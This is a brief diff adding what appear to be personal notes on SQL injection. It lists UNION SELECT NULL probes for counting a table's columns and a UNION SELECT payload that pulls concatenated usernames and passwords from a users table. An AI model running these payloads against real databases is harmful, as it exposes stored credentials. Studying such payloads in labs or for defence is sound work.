@@ -1,0 +1,7 @@
+Discover how many columns are in the table
+    UNION SELECT NULL --
+    UNION SELECT NULL,NULL
+
+
+Accessing the users table
+    UNION SELECT username || '~~'|| password FROM users --
